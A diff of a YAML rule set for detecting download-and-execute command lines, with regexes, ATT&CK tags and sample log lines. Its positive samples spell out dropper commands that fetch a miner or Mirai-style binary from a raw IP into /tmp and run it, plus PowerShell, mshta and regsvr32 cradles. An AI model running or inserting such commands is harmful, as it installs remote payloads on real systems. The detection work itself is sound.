@@ -4,7 +4,7 @@
 # shapes are weak or medium; the strong entries add what installers do not do (a raw IP host, a temp-directory
 # chmod-and-run, a script engine pointed at a URL).
 
-- id: mention.cradle.raw_ip_http_to_interpreter
+- id: mention.cradle_raw_ip_http_to_interpreter
   title: Content from an http:// raw IP address piped into a shell, interpreter or iex
   match:
     anchored: 'http://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}[^\n|]{0,300}\| {0,3}(?:sudo )?(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh|python[23]?|perl|iex|Invoke-Expression)\b'
@@ -30,7 +30,7 @@
       - 'Nov 20 11:00:02 web01 bash[6001]: HISTORY: curl -fsSL https://get.docker.com | sh'
       - 'Nov 20 11:00:03 mon01 bash[6002]: HISTORY: curl -s http://10.0.0.5:9100/metrics | grep node_load'
 
-- id: mention.cradle.raw_ip_https_to_interpreter
+- id: mention.cradle_raw_ip_https_to_interpreter
   title: Content from an https:// raw IP address piped into a shell, interpreter or iex
   match:
     anchored: 'https://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}[^\n|]{0,300}\| {0,3}(?:sudo )?(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh|python[23]?|perl|iex|Invoke-Expression)\b'
@@ -53,7 +53,7 @@
       - 'Nov 20 11:01:01 web01 bash[6004]: HISTORY: curl -sk https://10.0.0.5:6443/healthz'
       - 'Nov 20 11:01:02 web01 bash[6005]: HISTORY: curl -fsSL https://sh.rustup.rs | sh -s -- -y'
 
-- id: mention.cradle.curl_pipe_shell
+- id: mention.cradle_curl_pipe_shell
   title: curl output piped into a shell
   match:
     anchored: 'curl [^\n|]{0,300}\| {0,3}(?:sudo )?(?:-E )?(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
@@ -76,7 +76,7 @@
       - 'Nov 20 11:02:01 web01 bash[6007]: HISTORY: curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc'
       - 'Nov 20 11:02:02 web01 bash[6008]: HISTORY: curl -s https://api.example.org/v1/status | jq .'
 
-- id: mention.cradle.wget_pipe_shell
+- id: mention.cradle_wget_pipe_shell
   title: wget output piped into a shell
   match:
     anchored: 'wget [^\n|]{0,300}\| {0,3}(?:sudo )?(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
@@ -99,10 +99,10 @@
       - 'Nov 20 11:03:01 web01 bash[6010]: HISTORY: wget -q https://mirror.example.org/pkg.tar.gz -O /opt/pkg.tar.gz'
       - 'Nov 20 11:03:02 web01 bash[6011]: HISTORY: wget -qO- https://repo.example.org/key.asc | gpg --dearmor'
 
-- id: mention.cradle.curl_chmod_run
-  title: curl download, chmod and run in one command line
+- id: mention.cradle_curl_chmod_run
+  title: curl download, chmod and run from a temp directory in one command line
   match:
-    anchored: 'curl [^\n]{1,200}(?:;|&&) {0,2}chmod {1,3}(?:\+x|[ua]\+x|[0-7]{3,4}) {1,3}[^\n]{1,100}(?:;|&&) {0,2}(?:\./|/tmp/|/var/tmp/|/dev/shm/|nohup |sh |bash )'
+    anchored: 'curl [^\n]{1,200}(?:;|&&) {0,2}chmod {1,3}(?:\+x|[ua]\+x|[0-7]{3,4}) {1,3}[^\n]{0,40}(?:/tmp/|/var/tmp/|/dev/shm/)[^\n]{0,100}(?:;|&&) {0,2}(?:nohup )?(?:/tmp/|/var/tmp/|/dev/shm/)'
   case_sensitive: false
   strength: strong
   attack: [T1105, T1222.002, T1059.004]
@@ -113,21 +113,21 @@
     license: DRL-1.1
     upstream_id: a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa
   rationale: >-
-    Fetch, make executable and run straight away, in one line, is the dropper sequence of botnets, miners and
-    exploit payloads. Package managers never need it; a hand install of one binary into a PATH directory is the
-    benign case and usually does not run it from the current or a temp directory.
+    Fetch into /tmp, /var/tmp or /dev/shm, make executable and run it from there, in one line: the dropper sequence
+    of botnets, miners and exploit payloads. Vendor bootstrap scripts (for example get_helm.sh) are fetched and run
+    from the current directory, which the medium entry covers.
   examples:
     positive:
       - 'Nov 20 11:04:00 web01 bash[6012]: HISTORY: curl -o /tmp/k http://203.0.113.7/k; chmod +x /tmp/k; /tmp/k'
-      - 'Nov 20 11:04:01 web01 bash[6013]: HISTORY: curl -sO http://203.0.113.7/xmr && chmod 755 xmr && ./xmr -B'
+      - 'Nov 20 11:04:01 web01 bash[6013]: HISTORY: curl -s http://203.0.113.7/xmr -o /dev/shm/xmr && chmod 755 /dev/shm/xmr && nohup /dev/shm/xmr -B'
     negative:
       - 'Nov 20 11:04:02 web01 bash[6014]: HISTORY: curl -Lo /usr/local/bin/kubectl https://dl.k8s.io/release/v1.31.0/bin/linux/amd64/kubectl && chmod +x /usr/local/bin/kubectl'
       - 'Nov 20 11:04:03 web01 bash[6015]: HISTORY: curl -s https://api.example.org/v1/status'
 
-- id: mention.cradle.wget_chmod_run
-  title: wget download, chmod and run in one command line
+- id: mention.cradle_wget_chmod_run
+  title: wget download, chmod and run from a temp directory in one command line
   match:
-    anchored: 'wget [^\n]{1,200}(?:;|&&) {0,2}chmod {1,3}(?:\+x|[ua]\+x|[0-7]{3,4}) {1,3}[^\n]{1,100}(?:;|&&) {0,2}(?:\./|/tmp/|/var/tmp/|/dev/shm/|nohup |sh |bash )'
+    anchored: 'wget [^\n]{1,200}(?:;|&&) {0,2}chmod {1,3}(?:\+x|[ua]\+x|[0-7]{3,4}) {1,3}[^\n]{0,40}(?:/tmp/|/var/tmp/|/dev/shm/)[^\n]{0,100}(?:;|&&) {0,2}(?:nohup )?(?:/tmp/|/var/tmp/|/dev/shm/)'
   case_sensitive: false
   strength: strong
   attack: [T1105, T1222.002, T1059.004]
@@ -138,17 +138,40 @@
     license: DRL-1.1
     upstream_id: a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa
   rationale: >-
-    The wget form of the fetch-chmod-run dropper, the Mirai-family loader shape on IoT and Linux servers. Same
-    reasoning as the curl entry: an admin installing one binary puts it in a PATH directory and does not run it from
-    a temp or current directory on the same line.
+    The wget form of the temp-directory fetch-chmod-run dropper used by Mirai-family loaders and miner kits. Same
+    reasoning as the curl entry; the current-directory form is the medium entry.
   examples:
     positive:
-      - 'Nov 20 11:05:00 cam01 sh[300]: cd /tmp; wget http://203.0.113.7/bins/mips; chmod 777 mips; ./mips telnet.mips'
+      - 'Nov 20 11:05:00 cam01 sh[300]: wget http://203.0.113.7/bins/mips -O /tmp/mips; chmod 777 /tmp/mips; /tmp/mips telnet.mips'
     negative:
       - 'Nov 20 11:05:01 web01 bash[6016]: HISTORY: wget -O /usr/local/bin/jq https://example.org/jq && chmod +x /usr/local/bin/jq'
       - 'Nov 20 11:05:02 web01 bash[6017]: HISTORY: wget -q https://mirror.example.org/sha256sums.txt'
 
-- id: mention.cradle.chmod_exec_in_dev_shm
+- id: mention.cradle_download_chmod_run_cwd
+  title: curl or wget download, chmod and run from the current directory or a shell
+  match:
+    anchored: 'chmod {1,3}(?:\+x|[ua]\+x|[0-7]{3,4}) {1,3}[^\n]{1,100}(?:;|&&) {0,2}(?:\./|nohup \./|sh |bash )'
+  case_sensitive: false
+  strength: weak
+  attack: [T1105, T1222.002, T1059.004]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Download and Execute Pattern via Curl/Wget (Aayush Gupta)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_curl_wget_exec_tmp.yml
+    license: DRL-1.1
+    upstream_id: a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa
+  rationale: >-
+    Making a file executable and running it on the same line ('chmod +x x; ./x'). Droppers do this after cd /tmp,
+    and so do official bootstrap scripts (helm, k3s) and developers, so it is context only; the temp-directory
+    entries are the strong form.
+  examples:
+    positive:
+      - 'Nov 20 11:05:03 cam01 sh[300]: cd /tmp; wget http://203.0.113.7/bins/mips; chmod 777 mips; ./mips telnet.mips'
+    negative:
+      - 'Nov 20 11:05:04 web01 bash[6023]: HISTORY: chmod +x /usr/local/bin/kubectl'
+      - 'Nov 20 11:05:05 web01 bash[6024]: HISTORY: chmod 600 ~/.ssh/id_ed25519'
+
+- id: mention.cradle_chmod_exec_in_dev_shm
   title: File in /dev/shm made executable
   match:
     anchored: 'chmod {1,3}(?:\+x|[ua]\+x|[0-7]{3,4}) {1,3}/dev/shm/'
@@ -171,7 +194,7 @@
       - 'Nov 20 11:06:01 db01 postgres[700]: could not open shared memory segment "/dev/shm/PostgreSQL.1234": No such file'
       - 'Nov 20 11:06:02 web01 bash[6019]: HISTORY: df -h /dev/shm'
 
-- id: mention.cradle.cd_dev_shm
+- id: mention.cradle_cd_dev_shm
   title: Working directory changed to /dev/shm
   match:
     literal: ['cd /dev/shm']
@@ -194,7 +217,7 @@
       - 'Nov 20 11:07:01 web01 bash[6021]: HISTORY: cd /var/www/html'
       - 'Nov 20 11:07:02 web01 bash[6022]: HISTORY: ls -la /dev/shm'
 
-- id: mention.cradle.ps_webclient_download
+- id: mention.cradle_ps_webclient_download
   title: PowerShell Net.WebClient download into memory
   match:
     anchored: 'New-Object {1,3}(?:System\.)?Net\.WebClient\)\.Download(?:String|Data)\('
@@ -218,7 +241,7 @@
       - 'powershell -c "(New-Object Net.WebClient).Headers.Add(''User-Agent'',''inventory'')"'
       - 'powershell -c "Invoke-WebRequest https://intranet.example.org/report.csv -OutFile C:\Reports\r.csv"'
 
-- id: mention.cradle.ps_downloadstring_raw_ip
+- id: mention.cradle_ps_downloadstring_raw_ip
   title: PowerShell DownloadString from a raw IP address
   match:
     anchored: 'DownloadString\( {0,2}["'']https?://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
@@ -241,7 +264,7 @@
       - 'powershell -c "iex ((New-Object System.Net.WebClient).DownloadString(''https://community.chocolatey.org/install.ps1''))"'
       - 'powershell -c "$wc.DownloadFile(''http://10.0.0.5/tools/agent.msi'', ''C:\Temp\agent.msi'')"'
 
-- id: mention.cradle.ps_iex_download_prefix
+- id: mention.cradle_ps_iex_download_prefix
   title: PowerShell iex wrapped around a web download
   match:
     literal:
@@ -284,7 +307,7 @@
       - 'powershell -c "Invoke-Expression -Command $localScript"'
       - 'powershell -c "irm https://api.example.org/v1/status | ConvertTo-Json"'
 
-- id: mention.cradle.ps_invoke_web_to_iex
+- id: mention.cradle_ps_invoke_web_to_iex
   title: Invoke-WebRequest or Invoke-RestMethod piped into iex
   match:
     anchored: 'Invoke-(?:WebRequest|RestMethod) [^\n|]{1,300}\| {0,3}(?:iex|Invoke-Expression)\b'
@@ -307,7 +330,7 @@
       - 'powershell -c "Invoke-WebRequest https://intranet.example.org/a.zip -OutFile C:\Temp\a.zip"'
       - 'powershell -c "Invoke-RestMethod https://api.example.org/v1/items | Select-Object -First 5"'
 
-- id: mention.cradle.ps_iwr_to_iex
+- id: mention.cradle_ps_iwr_to_iex
   title: iwr alias piped into iex
   match:
     anchored: 'iwr [^\n|]{1,300}\| {0,3}(?:iex|Invoke-Expression)\b'
@@ -329,7 +352,7 @@
       - 'powershell -c "iwr https://intranet.example.org/a.zip -OutFile a.zip"'
       - 'powershell -c "iwr https://api.example.org/health | Select-Object StatusCode"'
 
-- id: mention.cradle.ps_irm_to_iex
+- id: mention.cradle_ps_irm_to_iex
   title: irm alias piped into iex
   match:
     anchored: 'irm [^\n|]{1,300}\| {0,3}(?:iex|Invoke-Expression)\b'
@@ -352,7 +375,7 @@
       - 'powershell -c "irm https://api.example.org/v1/items | Format-Table"'
       - 'powershell -c "Get-Content .\notes.txt | Select-String term"'
 
-- id: mention.cradle.certutil_url_download
+- id: mention.cradle_certutil_url_download
   title: certutil fetching a URL
   match:
     anchored: 'certutil(?:\.exe)?["'']?[^\n]{0,40}[-/](?:urlcache|verifyctl)[^\n]{0,60}(?:https?|ftp)://'
@@ -375,7 +398,7 @@
       - 'certutil -urlcache * delete'
       - 'certutil -verify -urlfetch C:\certs\server.cer'
 
-- id: mention.cradle.certutil_decode
+- id: mention.cradle_certutil_decode
   title: certutil decoding a base64 or hex file
   match:
     anchored: 'certutil(?:\.exe)?["'']?[^\n]{0,40}[-/]decode(?:hex)? '
@@ -398,7 +421,7 @@
       - 'certutil -encode C:\certs\server.cer C:\certs\server.b64'
       - 'certutil -dump C:\certs\server.cer'
 
-- id: mention.cradle.bitsadmin_transfer
+- id: mention.cradle_bitsadmin_transfer
   title: bitsadmin transfer from a URL
   match:
     anchored: 'bitsadmin(?:\.exe)?["'']?[^\n]{0,40}[/-]transfer [^\n]{0,200}(?:https?|ftp)://'
@@ -421,7 +444,7 @@
       - 'bitsadmin /list /allusers'
       - 'bitsadmin /info job1 /verbose'
 
-- id: mention.cradle.mshta_remote
+- id: mention.cradle_mshta_remote
   title: mshta running a remote HTA
   match:
     anchored: 'mshta(?:\.exe)?["'']? {1,3}["'']?(?:https?|ftp)://'
@@ -444,7 +467,7 @@
       - 'C:\Windows\System32\mshta.exe C:\Program Files\Vendor\setup.hta'
       - 'C:\Windows\System32\mshta.exe "\\fileserver\apps\launcher.hta"'
 
-- id: mention.cradle.mshta_inline_script
+- id: mention.cradle_mshta_inline_script
   title: mshta running inline VBScript or JavaScript
   match:
     anchored: 'mshta(?:\.exe)?["'']? {1,3}["'']?(?:vbscript|javascript):'
@@ -468,7 +491,7 @@
       - 'mshta.exe C:\Tools\hta\inventory.hta'
       - 'C:\Windows\System32\mshta.exe "C:\Program Files\Vendor\about.hta"'
 
-- id: mention.cradle.regsvr32_remote_scriptlet
+- id: mention.cradle_regsvr32_remote_scriptlet
   title: regsvr32 loading a scriptlet from a URL (Squiblydoo)
   match:
     anchored: 'regsvr32(?:\.exe)?["'']? [^\n]{0,80}[/-]i:["'']?(?:https?|ftp)://'
@@ -492,7 +515,7 @@
       - 'regsvr32 /s C:\Program Files\Vendor\plugin.dll'
       - 'regsvr32 /u /s "C:\Program Files\Vendor\old.ocx"'
 
-- id: mention.cradle.rundll32_javascript
+- id: mention.cradle_rundll32_javascript
   title: rundll32 running JavaScript through mshtml
   match:
     anchored: 'rundll32(?:\.exe)?["'']? {1,3}["'']?javascript:'
@@ -515,7 +538,7 @@
       - 'rundll32.exe shell32.dll,Control_RunDLL desk.cpl'
       - 'C:\Windows\System32\rundll32.exe C:\Windows\System32\printui.dll,PrintUIEntry /il'
 
-- id: mention.cradle.mshtml_runhtmlapplication
+- id: mention.cradle_mshtml_runhtmlapplication
   title: mshtml RunHTMLApplication entry point
   match:
     literal: [',RunHTMLApplication']
@@ -538,7 +561,7 @@
       - 'rundll32.exe C:\Windows\System32\mshtml.dll,PrintHTML "C:\Temp\page.htm"'
       - 'rundll32.exe url.dll,FileProtocolHandler https://intranet.example.org/'
 
-- id: mention.cradle.wmic_remote_xsl
+- id: mention.cradle_wmic_remote_xsl
   title: wmic /format pointing at a remote stylesheet (SquiblyTwo)
   match:
     anchored: 'wmic(?:\.exe)?["'']? [^\n]{0,150}[/-]format:["'']?(?:https?://|\\\\)'
@@ -562,7 +585,7 @@
       - 'wmic os get caption,version /format:list'
       - 'wmic logicaldisk get name,freespace /format:csv'
 
-- id: mention.cradle.msiexec_remote
+- id: mention.cradle_msiexec_remote
   title: msiexec installing a package from a URL
   match:
     anchored: 'msiexec(?:\.exe)?["'']? [^\n]{0,60}[/-](?:i|package) {0,2}["'']?https?://'
